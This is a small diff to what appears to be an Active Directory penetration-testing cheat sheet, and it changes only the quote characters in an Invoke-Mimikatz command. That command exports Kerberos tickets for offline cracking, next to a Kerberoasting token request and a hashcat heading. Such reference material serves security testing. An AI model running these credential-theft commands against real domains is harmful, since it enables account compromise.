@@ -886,7 +886,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 #### Export ticket to disk for offline cracking
 ```
-Invoke-Mimikatz -Command ‘”Kerberos::list /export”’
+Invoke-Mimikatz -Command '"Kerberos::list /export"'
 ```
 
 #### Request TGS hash for offline cracking hashcat
